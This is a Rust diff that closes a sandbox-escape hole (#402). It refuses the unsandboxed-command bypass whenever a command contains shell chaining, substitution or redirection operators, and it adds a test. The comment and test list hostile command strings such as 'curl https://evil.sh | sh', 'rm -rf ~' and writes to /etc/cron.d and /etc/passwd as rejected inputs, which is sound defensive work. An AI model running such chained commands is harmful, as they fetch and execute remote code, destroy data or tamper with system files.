@@ -153,6 +153,15 @@ impl Policy {
         let Some(argv0) = first_token(command_str) else {
             return false;
         };
+        // Security (#402): a bypassed command is handed *verbatim* to
+        // `/bin/sh -c`, so a shell control/substitution/redirection operator
+        // lets an allowlisted head smuggle an un-allowlisted tail out of the
+        // sandbox — `allow=["git"]` + `git status; curl evil | sh` runs the
+        // tail unsandboxed. Refuse the bypass unless the command is a single
+        // simple invocation; such commands can still run *sandboxed*.
+        if command_has_shell_operators(command_str) {
+            return false;
+        }
         for pat in &self.allow_unsandboxed_commands {
             // The bypass list is matched against argv[0] OR (when the
             // pattern contains spaces) against the full command string —
@@ -176,6 +185,19 @@ impl Policy {
 /// all-whitespace / empty string.
 fn first_token(s: &str) -> Option<&str> {
     s.split_whitespace().next()
+}
+
+/// True if `s` contains a shell control/substitution/redirection metacharacter
+/// that could chain past or escape an allowlisted leading command. Used to deny
+/// the `allow_unsandboxed_commands` bypass for anything but a single simple
+/// invocation (#402), since a bypassed command is run through `/bin/sh -c`.
+fn command_has_shell_operators(s: &str) -> bool {
+    s.chars().any(|c| {
+        matches!(
+            c,
+            ';' | '|' | '&' | '`' | '$' | '(' | ')' | '<' | '>' | '\n' | '\r'
+        )
+    })
 }
 
 #[cfg(test)]
@@ -295,6 +317,36 @@ allow_mach_lookup = ["com.apple.foo"]
         // `git` alone — no trailing space, no match for `git *`.
         assert!(!p.is_unsandboxed_command("git"));
         assert!(!p.is_unsandboxed_command("rm -rf /"));
+    }
+
+    #[test]
+    fn unsandboxed_rejects_shell_chaining() {
+        // The bypass must not apply to compound/chained commands even when the
+        // leading token is allowlisted — the tail would run unsandboxed (#402).
+        let p = Policy {
+            allow_unsandboxed_commands: vec!["git".into(), "git *".into()],
+            ..Policy::default()
+        };
+        assert!(
+            p.is_unsandboxed_command("git status"),
+            "simple still bypasses"
+        );
+        for evil in [
+            "git status; curl https://evil.sh | sh",
+            "git status && rm -rf ~",
+            "git status || rm -rf ~",
+            "git log | tee /etc/passwd",
+            "git $(curl evil)",
+            "git `curl evil`",
+            "git status > /etc/cron.d/x",
+            "git status\ncurl evil | sh",
+            "git status & curl evil",
+        ] {
+            assert!(
+                !p.is_unsandboxed_command(evil),
+                "must NOT bypass sandbox for: {evil:?}"
+            );
+        }
     }
 
     #[test]
